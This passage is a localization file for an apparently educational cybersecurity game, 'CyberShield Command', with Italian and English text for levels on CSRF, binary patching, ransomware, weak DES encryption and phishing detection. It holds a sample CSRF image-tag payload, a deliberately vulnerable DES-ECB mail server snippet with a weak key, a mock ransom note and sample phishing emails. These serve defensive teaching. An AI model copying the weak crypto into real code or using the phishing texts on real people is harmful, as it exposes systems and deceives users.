        vary: 'Vary header abilitato:',
        time: 'Tempo completamento:',
        success: 'RISULTATO: Minaccia Cache Poisoning neutralizzata!',
        completed: 'RISULTATO: Completato.',
        fail: 'Tempo scaduto! L\'attacco Cache Poisoning ha colpito troppi utenti.\n\nSvuota la cache e configura gli header corretti più velocemente la prossima volta.'
      }
    },
    // Level 6: CSRF
    level6: {
      browser: {
        portal: {
          title: 'Portale Finanziario Aziendale',
          header: 'Portale Finanziario Aziendale',
          vulnerable: '⚠️ VULNERABILE',
          secure: '✅ SICURO',
          warningTitle: '⚠️ ALLERTA SICUREZZA',
          warningText: 'Vulnerabilità CSRF rilevata! Le richieste non sono validate.',
          warningRisk: 'Rischio: Trasferimenti non autorizzati, furto account, modifica dati',
          secureTitle: '✅ MODALITÀ SICURA',
          secureText: 'Protezione CSRF attiva. Tutte le richieste sono validate.',
          secureProt: 'Protezione: Token CSRF, Cookie SameSite, Validazione Origine',
          account: {
            title: 'Riepilogo Conto',
            holder: 'Intestatario',
            number: 'Numero Conto',
            balance: 'Saldo Corrente',
            unauthorized: '⚠️ Trasferimento non autorizzato rilevato!',
            email: 'Email'
          },
          activity: {
            title: 'Attività Recente',
            blockReason: 'Protezione CSRF attiva',
            blockedLabel: '🛡️ BLOCCATO',
            csrfLabel: '🚨 CSRF',
            forged: '⚠️ Questa richiesta è stata forgiata da un sito esterno!',
            completed: 'COMPLETATO',
            blocked: 'BLOCCATO',
            amount: 'Importo:',
            newEmail: 'Nuova email:',
            origin: 'Origine:'
          },
          addComment: 'Aggiungi Commento',
          placeholder: 'Condividi i tuoi pensieri...',
          postBtn: 'Pubblica Commento'
        },
        dashboard: {
          title: 'Cruscotto Protezione CSRF',
          protections: {
            title: '🛡️ Protezioni Attive',
            tokens: 'Token CSRF (Synchronizer Pattern)',
            sameSite: 'Cookie SameSite',
            origin: 'Validazione Origine/Referer',
            double: 'Double Submit Cookie',
            enabled: '✅ ABILITATO',
            disabled: '❌ DISABILITATO'
          },
          risk: {
            title: '📊 Analisi Rischio CSRF',
            level: 'Livello Rischio Complessivo',
            critical: 'CRITICO',
            low: 'BASSO',
            detected: 'Richieste CSRF Rilevate:',
            unauthorized: 'Azioni Non Autorizzate:',
            executed: 'ESEGUITE ⚠️',
            blocked: 'BLOCCATE ✅',
            loss: 'Perdita Finanziaria:',
            yes: 'SÌ (Cookie, Sessioni)',
            no: 'NO'
          },
          vectors: {
            title: '🎯 Vettori Attacco CSRF Noti',
            form: {
              title: '1. Invio Form Malevolo',
              desc: 'L\'attaccante ospita un form nascosto che invia automaticamente al sito vittima'
            },
            img: {
              title: '2. Exploit Tag Immagine',
              desc: '<img src="bank.com/transfer?amount=5000">'
            },
            xhr: {
              title: '3. XMLHttpRequest/Fetch',
              desc: 'JavaScript che effettua richieste autenticate al sito vittima'
            }
          }
        },
        malicious: {
          title: 'Sito Malevolo',
          header: '☠️ Sito dell\'Attaccante',
          desc: 'Questa pagina malevola contiene attacchi CSRF nascosti:',
          how: {
            title: '🎯 Come funziona il CSRF:',
            list: [
              'Dipendente accede a company-finance.internal (cookie sessione impostato)',
              'Dipendente visita sito attaccante (questa pagina)',
              'Form nascosto invia automaticamente a company-finance.internal',
              'Il browser include automaticamente il cookie di sessione',
              'Il portale finanziario esegue la richiesta come se l\'avesse fatta il dipendente',
              'Fondi aziendali trasferiti senza autorizzazione!'
            ]
          }
        }
      },
      terminal: {
        initial: [
          '$ Terminale Difesa CSRF v6.0',
          '$ Digita "help" per i comandi disponibili',
          '$ ⚠️  ATTENZIONE: Attacchi CSRF rilevati sul portale finanziario!'
        ],
        analyze: {
          header: '=== ANALISI RICHIESTE ===',
          total: 'Totale richieste:',
          legitimate: 'Richieste legittime:',
          csrf: 'Richieste CSRF:',
          patterns: 'Pattern sospetti rilevati:',
          action: '⚠️ Azione richiesta: Abilita protezione CSRF!'
        },
        transaction: {
          header: '=== DETTAGLI TRANSAZIONE ===',
          id: 'ID:',
          time: 'Ora:',
          user: 'Utente:',
          action: 'Azione:',
          amount: 'Importo:',
          destination: 'Destinazione:',
          origin: 'Origine:',
          status: 'Stato:',
          csrf: 'CSRF:',
          yes: 'SÌ ⚠️',
          no: 'NO ✓',
          risk: 'Rischio: CRITICO - Richiesta forgiata eseguita!',
          safe: 'Stato: Sicuro'
        },
        identify: {
          header: '=== IDENTIFICAZIONE ATTACCO CSRF ===',
          type: 'Tipo: CLASSIC CSRF (Cross-Site Request Forgery)',
          desc: 'Descrizione: Richieste state-changing non autorizzate',
          vector: 'Vettore: Siti esterni che inviano richieste autenticate',
          impact: 'Impatto: Trasferimenti non autorizzati, modifiche account',
          chars: 'Caratteristiche Attacco:',
          success: '✓ Tipo di attacco CSRF identificato con successo!'
        },
        tokens: {
          already: '[!] Token CSRF già abilitati',
          success: '[✓] Token CSRF abilitati (Synchronizer Token Pattern)\n[+] Token univoco generato per sessione\n[+] Token richiesto in tutte le richieste state-changing\n[+] Server valida il token prima di elaborare\n[+] Rischio CSRF: SIGNIFICATIVAMENTE RIDOTTO'
        },
        sameSite: {
          already: '[!] Cookie SameSite già abilitati',
          success: '[✓] Attributo SameSite cookie abilitato\n[+] Cookie non inviati con richieste cross-site\n[+] Policy: SameSite=Strict\n[+] Previene inclusione automatica cookie\n[+] Rischio CSRF: RIDOTTO'
        },
        origin: {
          already: '[!] Validazione Origine già abilitata',
          success: '[✓] Validazione Origin/Referer abilitata\n[+] Controllo header Origin sulle richieste\n[+] Blocco richieste da domini esterni\n[+] Origine attesa: company-finance.internal\n[+] Rischio CSRF: RIDOTTO'
        },
        double: {
          already: '[!] Double Submit Cookie già abilitato',
          success: '[✓] Pattern Double Submit Cookie abilitato\n[+] Token CSRF salvato nel cookie E nel parametro richiesta\n[+] Server confronta entrambi i valori\n[+] Attaccante non può leggere cookie (SOP)\n[+] Rischio CSRF: RIDOTTO'
        },
        restart: {
          req: '[!] Nessun cambiamento di sicurezza rilevato. Applica prima le protezioni.',
          success: '[✓] Portale finanziario riavviato\n[✓] Nuove configurazioni di sicurezza applicate',
          status: '[✓] Stato protezione CSRF:',
          mitigated: '[✓] Attacco CSRF mitigato con successo!',
          recommend: '[!] Protezioni aggiuntive raccomandate'
        },
        balance: {
          header: '=== STATO CONTO ===',
          current: 'Saldo Corrente:',
          original: 'Saldo Originale:',
          loss: 'Perdita:',
          secure: 'Stato: Sicuro ✓',
          warning: 'ATTENZIONE: Trasferimento non autorizzato rilevato!',
          safe: 'Nessuna transazione non autorizzata'
        },
        scan: {
          header: '=== SCANSIONE VULNERABILITÀ CSRF ===',
          found: 'VULNERABILITÀ TROVATE:',
          none: '✓ Nessuna vulnerabilità critica rilevata',
          recs: 'Raccomandazioni:\n1. Implementa Token CSRF (CRITICO)\n2. Abilita Cookie SameSite (ALTO)\n3. Valida header Origin/Referer (ALTO)\n4. Considera pattern Double Submit Cookie (MEDIO)',
          missingTokens: '- Token CSRF mancanti',
          missingSameSite: '- Cookie SameSite non configurati',
          missingOrigin: '- Nessuna validazione Origin/Referer',
          missingDouble: '- Double Submit Cookie non implementato'
        },
        status: {
          header: '=== STATO SICUREZZA ===',
          active: 'Attacco CSRF Attivo:',
          unauth: 'Azioni Non Autorizzate:',
          app: 'Stato App:',
          restarted: 'RIAVVIATA',
          running: 'IN ESECUZIONE',
          type: 'Tipo CSRF Identificato:',
          notYet: 'NON ANCORA',
          balance: 'Saldo Conto:',
          protections: 'Protezioni Attive:',
          yes: '🔴 SÌ',
          no: '🟢 NO'
        },
        help: "Disponibili: analyze-requests, show-transaction <id>, identify-csrf, enable-csrf-tokens, enable-samesite, enable-origin-check, restart-app, status"
      },
      logMessages: {
        sessionCreated: 'Utente john.doe loggato - Sessione creata',
        attackDetected: 'Attacco CSRF: Richiesta di trasferimento non autorizzata da origine esterna',
        blocked: 'Tentativo CSRF bloccato: Token CSRF mancante o non valido',
        execution: 'CRITICO: Trasferimento denaro eseguito senza consenso utente',
        rejected: 'Richiesta respinta: Validazione Origine fallita',
        sessionHijacked: 'CSRF: Richiesta cambio email da origine sospetta - Sessione utente dirottata',
        sameSiteBlocked: 'Policy cookie SameSite attiva - Richiesta cross-site bloccata',
        normal: 'Attività utente normale - Richiesta GET con sessione valida',
        passwordChange: 'Cambio password eseguito via CSRF - Credenziali utente compromesse',
        tokenPassed: 'Validazione token CSRF: PASSATA - Richiesta autenticata',
        multipleAttempts: 'Tentativi CSRF multipli rilevati - Pattern attacco: Richieste state-changing falsificate',
        validated: 'Tutte le richieste state-changing validate - Protezione CSRF attiva',
        vectorConfirmed: 'Vettore attacco CSRF confermato - Form malevoli incorporati su siti esterni',
        doubleEnforced: 'Pattern double-submit cookie applicato - Tutte le richieste sicure'
      },
      hints: {
        step0: 'Nel SIEM analizza le transazioni. Vedi richieste da origini esterne (evil-site.com)? Nel TERMINALE usa "analyze-requests" per analizzare i dettagli della richiesta CSRF.',
        step1: 'Hai identificato CSRF! Nel TERMINALE usa "enable-csrf-tokens" per aggiungere token di verifica alle richieste state-changing (transfer, delete, etc).',
        step2: 'Nel TERMINALE aggiungi "enable-samesite" per protezione extra sui cookie, poi usa "restart-app" per riavviare l\'applicazione con le nuove protezioni.',
        step3: {
          a: '✅ Bene! Le protezioni CSRF sono attive. Nel TERMINALE usa "status" per verificare i token, poi controlla il balance nel BROWSER.',
          b: 'Ricorda: CSRF tokens e SameSite cookies proteggono dalle richieste non autorizzate provenienti da siti malvagi. Nel TERMINALE verifica con "status".',
          c: 'Stai per completare il livello! Nel TERMINALE assicurati che "enable-csrf-tokens" e "enable-samesite" siano entrambi attivi, poi verifica i fondi nel BROWSER.'
        },
        default: '✅ Nel TERMINALE controlla lo stato con "status" e verifica il balance nel BROWSER!'
      },
      debrief: {
        title: 'ANALISI DIFESA CSRF',
        protections: 'Protezioni attivate:',
        unauth: 'Azioni non autorizzate:',
        active: 'ATTIVE',
        blocked: 'BLOCCATE',
        balance: 'Saldo conto:',
        time: 'Tempo completamento:',
        success: 'RISULTATO: Attacco CSRF mitigato con successo!',
        completed: 'RISULTATO: Completato.',
        fail: 'I fondi del conto sono stati rubati tramite attacchi CSRF riusciti.\n\nAttiva i token CSRF e la protezione cookie SameSite prima di riavviare.'
      }
    },
    // Level 7
    level7: {
      title: "Livello 7: Reverse Engineering & Patching",
      subtitle: "Analizza la logica binaria e aggira i controlli di sicurezza",
      siem: {
        startup: "Avvio sistema",
        login: "Login utente",
        bypass: "Rilevato Auth Bypass: Accesso admin concesso ad utente anonimo."
      },
      terminal: {
        waiting: "In attesa di task...",
        alert: "ALLERTA: Vulnerabilità rilevata in 'auth.exe'.",
        action: "AZIONE RICHIESTA: Correggi la logica di controllo sicurezza.",
        authPatched: "auth.exe patchato. Pronto per compilazione & test.",
        updaterPatched: "updater.exe patchato. Pronto per compilazione & test.",
        compilingAuth: "Compilazione auth.exe... OK. (Binario patchato)",
        compilingUpdater: "Compilazione updater.exe... OK. (Binario patchato)",
        nothing: "Niente da compilare.",
        execAuth: "Esecuzione auth.exe...",
        enterCode: "Inserisci Codice Accesso: 195932126",
        accessGranted: "[SUCCESSO] Accesso Consentito! Sistema Sbloccato.",
        vulnFixed: "STATO: Vulnerabilità fixata. Il codice è ora richiesto.",
        nextInstruction: "ISTRUZIONE: Ora analizza 'updater.exe'. Ha un difetto simile.",
        failAuth: "FALLITO: Il sistema accetta ancora QUALSIASI codice! Devi restringerlo.",
        execUpdater: "Esecuzione updater.exe...",
        sigVerified: "[SUCCESSO] Firma Verificata (Bypass). Aggiornamento in corso...",
        missionAccomplished: "MISSIONE COMPIUTA.",
        sigFailed: "[ERRORE] Verifica Firma Fallita!",
        failUpdater: "FALLITO: Il servizio di aggiornamento ha bloccato l'esecuzione.",
        help: "Disponibili: ls, build, ./auth.exe, ./updater.exe"
      },
      hints: {
        phase0: "Monitora il SIEM. Attendi un alert di sicurezza critico.",
        phase1: [
          "Abbiamo rilevato che 'auth.exe' garantisce l'accesso a chiunque. Sembra esserci un grave errore di programmazione (Debug Mode lasciato attivo).",
          "Analizza il codice C decompilato tramite 'RE Tool'. Cerca la funzione 'check_credentials'. Noti qualcosa di strano nell'istruzione IF?",
          "L'istruzione 'if(1)' (o if(true)) rende la condizione sempre vera, bypassando ogni controllo. Dobbiamo ripristinare la sicurezza.",
          "Modifica il codice: sostituisci 'if(1)' con un controllo sul codice di sicurezza. Il codice corretto dovrebbe essere 195932126 (0xBADC0DE). Es: 'if (input_code == 195932126)'"
        ],
        phase2: "Ora che hai ripristinato la sicurezza, tramite terminale compila con 'build' ed esegui './auth.exe' per verificare che l'accesso sia protetto.",
        phase3: "Perfetto, ora fallo di nuovo. 'updater.exe' ha un problema opposto. Blocca anche gli aggiornamenti validi. Analizzalo e correggi la logica.",
        phase4: "Hai patchato updater.exe? Bene. Ora compilalo ed eseguilo nel terminale come hai imparato."
      },
      debrief: {
        win: "VULNERABILITÀ IDENTIFICATA: Logic Bypass & Client-Side Trust.\n\nHai dimostrato come controlli di sicurezza implementati male lato client possono essere aggirati.\n\nLEZIONE APPRESA: Mai fidarsi dell'input lato client. La pulizia dei commenti e del codice di debug è fondamentale per non fornire indizi agli attaccanti.",
        loss: "MISSIONE FALLITA. Sistema compromesso o troppi errori commessi."
      }
    },
    // Level 8
    level8: {
      hints: {
        start: "Posta in arrivo: Rapporto attività sospette. Controlla la tua email per i Protocolli di Emergenza.",
        emergency: "Ottimo! Processo Terminato. Ora indaga sui log (SIEM) per trovare l'IP sorgente.",
        compromised: "SISTEMA COMPROMESSO! Trova l'override manuale! (Suggerimento: Il Manuale di Emergenza dice Ctrl+Alt+K per disabilitare l'interfaccia di rete e avviare l'indagine.)"
      },
      emails: {
        ciso: {
          subject: "URGENTE: Aggiornamento Protocolli Risposta Incidenti",
          preview: "Stiamo notando un aumento dell'attività ransomware...",
          body: "Gentile Team,\n\nStiamo notando un aumento dell'attività ransomware verso il nostro settore.\nSiete pregati di rivedere immediatamente il Manuale di Risposta agli Incidenti.\n\nPROCEDURA DI EMERGENZA PER RANSOMWARE:\n1. NON spegnere la macchina (la crittografia potrebbe corrompere i file).\n2. Se lo schermo è bloccato, utilizzare la sequenza di interruzione hardware: Ctrl + Alt + K.\n3. Isolare il segmento di rete.\n4. Identificare il vettore e la chiave di decrittazione.\n\nRestate vigili.",
          explanation: "Avviso di sicurezza legittimo dal CISO."
        },
        hr: {
          subject: "Revisioni Trimestrali delle Performance",
          preview: "Solo un promemoria che le revisioni inizieranno...",
          body: "Solo un promemoria che le revisioni inizieranno la prossima settimana. Per favore preparate la vostra autovalutazione.",
          explanation: "Email HR di routine."
        }
      },
      logs: {
        firewall: "Connessione in uscita consentita TCP 443",
        ids: "Rilevato download di file sospetto da 145.2.33.11",
        antivirus: "Scansione firma saltata per cryptolocker_v2.exe (Override Policy)"
      },
      files: {
        readme: "I TUOI FILE SONO STATI CRITTOGRAFATI!\nPer recuperare i dati, devi inserire la chiave di decrittazione.\nContatto: darkweb@anonymous.onion",
        urgent: "⚠️ ALLERTA RANSOMWARE ⚠️\nTutti i tuoi file sono crittografati.\nSegui le istruzioni in documents/README_DECRYPT.txt"
      },
      debrief: {
        win: "Ottimo lavoro. Hai intercettato con successo l'attacco ransomware, identificato la sorgente tramite analisi pacchetti e recuperato la chiave di decrittazione.",
        loss: "Missione Fallita. Il ransomware ha crittografato i sistemi critici prima che potessi dispiegare la contromisura."
      }
    },
    // Level 9
    level9: {
      hints: {
        intro: "Hai ricevuto una nuova email dall'HR. Sembra urgente... Apri la tua casella Email per leggerla.",
        suspicious: "Questa email sembra sospetta! Il reparto HR non chiederebbe mai di disabilitare i firewall. Potrebbe essere un tentativo di social engineering. Controlla il SIEM per verificare eventuali attività anomale.",
        mitm: "ALLARME! Il SIEM ha rilevato un attacco Man-in-the-Middle (MITM)! Qualcuno sta intercettando le comunicazioni. Questo potrebbe essere collegato alla richiesta sospetta nell'email. Dovremmo controllare il codice del server email.",
        crypto: "Il DES (Data Encryption Standard) è un algoritmo obsoleto e vulnerabile. Le 'weak keys' del DES producono chiavi identiche dopo il processo di generazione, rendendo la crittografia prevedibile. Apri il Code Editor per esaminare e correggere il codice.",
        fix: "Nel Code Editor, sostituisci l'algoritmo DES con AES-256. Cambia anche la chiave debole con una chiave sicura generata casualmente, puoi usare get_random_bytes(). Dopo vai nel Terminal per fare il build e aggiornare il server.",
        victory: "SISTEMA AGGIORNATO! Hai corretto con successo la vulnerabilità crittografica. Il server email ora utilizza AES-256, un algoritmo molto più sicuro del DES obsoleto.",
        success: "Ottimo! Hai sostituito DES con AES. Ora vai nel Terminal ed esegui: build mail_server e poi update mail_server",
        failAES: "Il codice non è ancora corretto. Devi sostituire tutte le occorrenze di DES con AES.",
        failDES: "Quasi! Ci sono ancora occorrenze di DES nel codice. Sostituiscile tutte con AES."
      },
      emails: {
        hr: {
          subject: "URGENTE: Disabilitare tutti i Firewall",
          preview: "Per manutenzione programmata, si richiede di disabilitare tutti i firewall...",
          body: "Gentile Team IT,\n\nPer manutenzione programmata del sistema, si richiede di disabilitare IMMEDIATAMENTE tutti i firewall aziendali.\n\nQuesta operazione è necessaria per permettere l'aggiornamento dei server principali. Una volta completata la manutenzione (circa 2 ore), potrete riattivare le protezioni.\n\nISTRUZIONI:\n1. Accedere al pannello di controllo del firewall\n2. Disabilitare tutte le regole di blocco\n3. Confermare via email l'avvenuta disabilitazione\n\nQuesta richiesta proviene direttamente dalla Direzione.\n\nCordiali saluti,\nHR Department\nCyberShield Corp",
          explanation: "Email sospetta: l'HR non dovrebbe mai richiedere la disabilitazione dei firewall."
        },
        security: {
          subject: "Report Settimanale Sicurezza",
          preview: "Riepilogo delle attività di sicurezza della settimana...",
          body: "Report Settimanale Sicurezza - CyberShield Corp\n\nRiepilogo attività:\n- 0 minacce rilevate\n- 15 tentativi di accesso bloccati\n- Sistema operativo al 100%\n\nProssimo report: Lunedì prossimo.",
          explanation: "Email legittima di routine."
        }
      },
      logs: {
        system: "Sistema avviato correttamente",
        auth: "Autenticazione utente riuscita: admin@cybershield",
        email: "Connessione inusuale rilevata su porta 25",
        mitm: "🚨 ATTACCO MITM RILEVATO! Intercettazione comunicazioni su canale SMTP. IP sospetto: 198.51.100.42"
      },
      terminal: {
        initialHistory: [
          "$ CyberShield Security Terminal v3.2.1",
          "$ Digita \"help\" per la lista dei comandi disponibili",
          "$ Digita \"status\" per verificare lo stato dei servizi",
          ""
        ],
        help: "Comandi disponibili: help, build, update, status, clear",
        status: {
          win: "✅ Mail Server: ONLINE (AES-256)\n   Stato: Sicuro\n   Vulnerabilità: 0\n\n🏆 Complimenti! Sistema completamente sicuro!",
          built: "✅ Mail Server: ONLINE (AES-256)\n   Stato: Sicuro\n   Vulnerabilità: 0",
          fixed: "⚠️ Mail Server: ONLINE (DES - VULNERABILE)\n   Stato: Richiede rebuild\n   Vulnerabilità: 1 CRITICA",
          vuln: "🔴 Mail Server: ONLINE (DES - VULNERABILE)\n   Stato: A rischio\n   Vulnerabilità: 1 CRITICA"
        },
        build: {
          error: "❌ Errore: Correggere prima le vulnerabilità nel codice sorgente.\n   Usa il Code Editor per modificare mail_server.py",
          success: "🔨 Compilazione mail_server in corso...\n   [====================================] 100%\n✅ Build completato con successo!\n   Output: mail_server_v2.2.0.bin\n   \nEsegui 'update mail_server' per applicare le modifiche.",
          hint: "✅ Build completato! Ora esegui l'update per applicare le modifiche.",
          usage: "Uso: build <nome_servizio>\nEsempio: build mail_server"
        },
        update: {
          error: "❌ Errore: Eseguire prima 'build mail_server'",
          successHint: "Sistema aggiornato! Esegui 'status' per verificare lo stato finale del server.",
          output: "🔄 Aggiornamento mail_server in corso...\n   Arresto servizio...          [OK]\n   Backup configurazione...     [OK]\n   Installazione nuova versione [OK]\n   Verifica integrità...        [OK]\n   Riavvio servizio...          [OK]\n\n✅ AGGIORNAMENTO COMPLETATO!\n   Versione: 2.2.0\n   Crittografia: AES-256\n   Stato: SICURO\n\n🛡️ La vulnerabilità è stata corretta con successo!",
          usage: "Uso: update <nome_servizio>\nEsempio: update mail_server"
        }
      },
      files: {
        mail_server: `# CyberShield Mail Server - Encryption Module
# Version: 2.1.3
# Last Updated: 2024-01-15

from Crypto.Cipher import DES
import base64

# Configurazione crittografia
ENCRYPTION_ALGORITHM = "DES"

# Chiave di crittografia per le comunicazioni
ENCRYPTION_KEY = b"\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01"

def encrypt_message(message):
    """
    Cripta i messaggi email per la trasmissione sicura.
    Utilizza DES per compatibilità con sistemi legacy.
    """
    cipher = DES.new(ENCRYPTION_KEY, DES.MODE_ECB)
    
    # Padding del messaggio a multipli di 8 byte
    padded_message = message + (8 - len(message) % 8) * ' '
    
    encrypted = cipher.encrypt(padded_message.encode())
    return base64.b64encode(encrypted).decode()

def decrypt_message(encrypted_message):
    """
    Decripta i messaggi email ricevuti.
    """
    cipher = DES.new(ENCRYPTION_KEY, DES.MODE_ECB)
    
    decoded = base64.b64decode(encrypted_message)
    decrypted = cipher.decrypt(decoded)
    
    return decrypted.decode().strip()

def send_secure_email(recipient, subject, body):
    """
    Invia un'email crittografata.
    """
    encrypted_body = encrypt_message(body)
    # ... resto della logica di invio
    pass

# Server initialization
if __name__ == "__main__":
    print("Mail Server avviato con crittografia", ENCRYPTION_ALGORITHM)
    print("Chiave configurata: [REDACTED]")
`
      },
      debrief: {
        win: "VULNERABILITÀ CORRETTA: DES con Chiavi Deboli\n\nIl DES (Data Encryption Standard) è un algoritmo di crittografia obsoleto con chiavi a 56 bit, facilmente violabile con attacchi brute-force moderni.\n\nLe \"Weak Keys\" del DES sono 4 chiavi speciali (come 0x0101010101010101) che producono sottochavi identiche durante il processo di cifratura. Questo significa che:\n• Cifrare due volte equivale a decifrare\n• Gli attaccanti possono predire pattern crittografici\n• Gli attacchi Man-in-the-Middle diventano banali\n\nHai sostituito DES con AES-256, un algoritmo moderno con chiavi a 256 bit, rendendo il sistema sicuro contro questi attacchi.",
        loss: "Missione Fallita. La vulnerabilità crittografica non è stata corretta in tempo. Gli attaccanti hanno sfruttato le chiavi deboli del DES per intercettare e decifrare le comunicazioni del server email."
      }
    },
    // Tutorial
    tutorial: {
      title: "TUTORIAL - SIEM Dashboard",
      subtitle: "Security Information and Event Management",
      logStream: "FLUSSO LOG",
      analysis: "ANALISI",
      source: "Origine",
      severity: "Gravità",
      threat: "Minaccia",
      message: "Messaggio",
      yes: "SÌ",
      no: "NO",
      selectLog: "Seleziona un log per analizzarlo",
      analyzeBtn: "ANALIZZA MINACCIA",
      blockBtn: "BLOCCA IP",
      showHelp: "MOSTRA AIUTO",
      hideHelp: "NASCONDI AIUTO",
      exit: "ESCI",
      success: "COMPLETATO!",
      successMsg: "Hai completato il tutorial SIEM! Ritorno alla mappa...",
      hints: {
        step0: "Inizia controllando le Email! Clicca sull'icona Email e leggi l'alert di sicurezza. È da lì che parte tutto!",
        step1: "Ottimo! Ora guarda il SIEM Dashboard (pannello in basso). CLICCA sul log rosso CRITICAL per analizzarlo in dettaglio!",
        step2: "Perfetto! Ora usa il Browser per cercare info. Visita \"SQL Injection Info\" per capire come funziona questo attacco.",
        step3: "Bene! Apri il Terminal e digita \"show-logs\" per vedere tutti i log. Troverai l'IP sospetto!",
        step4_attempt0: "Hai trovato diversi IP nei log! Prova a bloccare quello che ritieni sospetto. Digita \"help\" nel Terminal per vedere i comandi.",
        step4_attempt1: "SUGGERIMENTO: Prova a bloccare l'IP 192.168.1.100 con il comando \"block-ip 192.168.1.100\". Vediamo cosa succede!",
        step4_mistake: "Hai visto? Bloccare un IP sbagliato fa scendere la barra della vita! Ora blocca quello corretto: 203.0.113.42",
        step4_correct: "Il comando corretto è: \"block-ip 203.0.113.42\" - questo è l'IP malevolo che ha tentato l'SQL Injection."
      }
    },
    // Level Map
    levelMap: {
      title: "MAPPA LIVELLI",
      back: "INDIETRO",
      stars: "stelle",
      play: "GIOCA",
      levelInfo: {
        tutorial: { name: "Tutorial - Introduzione al SOC", description: "Apprendi le basi del Security Operations Center, leggi log SIEM e completa il tuo primo esercizio di sicurezza bloccando una minaccia." },
        level1: { name: "Rilevamento Phishing", description: "Identifica email di phishing malevoli tra quelle legittime e neutralizza attacchi di ingegneria sociale." },
        level2: { name: "Mitigazione Attacchi DDoS", description: "Analizza il traffico di rete, rileva flood HTTP e blocca IP malevoli durante un attacco DDoS." },
        level3: { name: "Difesa SQL Injection", description: "Riconosci vulnerabilità SQL Injection nel codice e implementa contromisure di sanitizzazione." },
        level4: { name: "Difesa XSS (Cross-Site Scripting)", description: "Identifica payload XSS malevoli, rimuovi contenuto dannoso e implementa protezioni per il portale aziendale." },
        level5: { name: "Difesa Cache Poisoning", description: "Rileva e ripulisci la cache avvelenata, configura header HTTP corretti per prevenire attacchi." },
        level6: { name: "Difesa CSRF (Cross-Site Request Forgery)", description: "Analizza transazioni bancarie, blocca richieste CSRF malevole e implementa protezioni multi-livello." },
        level7: { name: "Analisi Malware & Reverse Engineering", description: "Esegui il reverse engineering di eseguibili malevoli, analizza il codice assembler e neutralizza la minaccia." },
        level8: { name: "Mitigazione Ransomware", description: "Affronta un attacco Ransomware critico: attiva i protocolli di emergenza per isolare il sistema, analizza i pacchetti di rete per recuperare la chiave e decripta i file." },
        level9: { name: "Analisi Crittografica", description: "Individua falle nell'implementazione crittografica: analizza flussi di dati cifrati con algoritmi deboli, recupera chiavi compromesse e ripristina la riservatezza delle comunicazioni." }
      }
    },
    // Options
    options: {
      title: "OPZIONI",
      back: "INDIETRO",
      settings: "IMPOSTAZIONI",
      about: "INFORMAZIONI",
      credits: "CREDITI",
      language: "Linguaggio",
      audio: "Audio",
      musicVolume: "Volume Musica",
      sfxVolume: "Volume Effetti",
      saveSettings: "Salva Impostazioni",
      saveConfirm: "Impostazioni salvate con successo!",
      lastSaved: "Ultimo salvataggio:",
      aboutTitle: "Informazioni su CyberShield Command",
      aboutContent: {
        p1: "CyberShield Command è un serious game educativo progettato per insegnare i principi della cybersecurity attraverso gameplay interattivo e scenari del mondo reale.",
        p2: "Naviga attraverso 9 livelli impegnativi, ognuno focalizzato su diversi aspetti della cybersecurity tra cui sicurezza di rete, crittografia, rilevamento intrusioni, analisi malware e minacce persistenti avanzate.",
        p3Objective: "Obiettivo:",
        p3: "Padroneggia le competenze essenziali di cybersecurity difendendo contro varie minacce informatiche. Guadagna fino a 3 stelle per livello in base alle tue prestazioni.",
        version: "Versione:",
        projectType: "Tipo di Progetto:",
        projectTypeValue: "Serious Game per l'Educazione alla Cybersecurity",
        year: "Anno:"
      },
      creditsTitle: "Crediti",
      creditsContent: {
        devTeam: "Team di Sviluppo",
        teamMembers: [
          { name: "Alessandro Boffolo", role: "Game Designer & Developer" },
          { name: "Nicola Balzano", role: "Backend Developer" },
          { name: "Narcis Paviliuc", role: "Frontend Developer" }
        ],
        gameDesign: "Game Design & Development",
        magistrale: "Magistrale - Serious Games for Cyber Security",
        specialThanks: "Ringraziamenti Speciali",
        advisors: "Consulenti Educativi",
        experts: "Esperti di Cybersecurity",
        testers: "Beta Tester",
        tech: "Tecnologie Utilizzate",
        assets: "Risorse & Materiali",
        icons: "Icone: Unicode Emoji",
        palette: "Palette Colori: Tema Cyber Personalizzato",
        copyright: "© 2026 CyberShield Command. Tutti i diritti riservati."
      }
    }
  },
  english: {
    // Home
    home: {
      title: "CYBERSHIELD\nCOMMAND",
      subtitle: "Advanced Cyber Defense Interface",
      play: "PLAY",
      continua: "CONTINUE",
      newGame: "NEW GAME",
      options: "OPTIONS"
    },
    // Level 1: Phishing
    level1: {
      emails: [
        {
          id: 1,
          from: 'security@paypa1.com',
          timestamp: 'Today 09:15',
          subject: 'URGENT: Your account has been locked',
          preview: 'We detected suspicious activity on your account...',
          body: 'Dear Customer,\n\nWe noticed unauthorized access to your PayPal account. For your safety, the account has been temporarily locked.\n\nClick here to verify your identity and unlock the account: http://paypa1-verify.com/login\n\nIf you do not act within 24 hours, the account will be permanently closed.\n\nPayPal Support',
          explanation: 'PHISHING: Spoofed sender domain ("paypa1" instead of "paypal"), sense of urgency ("locked", "24 hours"), link to unofficial domain.',
          links: ['http://paypa1-verify.com/login']
        },
        {
          id: 2,
          from: 'hr@yourcompany.com',
          timestamp: 'Today 10:30',
          subject: 'Policy Update',
          preview: 'Please review the new document regarding...',
          body: 'Hi,\n\nAttached is the updated document regarding the new remote work policies, effective next month.\n\nPlease contact HR with any questions.\n\nBest regards,\nHR Team\nYourCompany Inc.',
          attachmentName: 'smart_working_policy_v2.pdf',
          explanation: 'LEGITIMATE: Internal email from correct corporate domain, professional tone, PDF attachment (safe document format).'
        },
        {
          id: 3,
          from: 'ceo.urgent123@gmail.com',
          timestamp: 'Today 14:55',
          subject: 'Urgent Wire Transfer',
          preview: 'I need you to process this payment immediately...',
          body: 'Hi,\n\nI am in a meeting and cannot talk on the phone. I need you to arrange an urgent wire transfer for a new vendor immediately. It is vital to close the deal today.\n\nI will send details shortly. Reply as soon as you read this.\n\nSent from my iPhone',
          explanation: 'PHISHING (CEO Fraud): Sender uses generic Gmail instead of corporate address, creates high urgency and psychological pressure to bypass procedures.'
        },
        {
          id: 4,
          from: 'support@microsoft.com',
          timestamp: 'Today 15:20',
          subject: 'Your Microsoft 365 Subscription',
          preview: 'Automatic renewal receipt...',
          body: 'Dear User,\n\nYour Microsoft 365 subscription has been automatically renewed as scheduled. You can find the receipt in your account.\n\nIf you have questions, visit support.microsoft.com\n\nMicrosoft Team',
          explanation: 'LEGITIMATE: Official Microsoft sender address, no request for sensitive data or strange links, informative tone.',
          links: ['https://support.microsoft.com']
        },
        {
          id: 5,
          from: 'winner@lottery-prize.xyz',
          timestamp: 'Today 16:45',
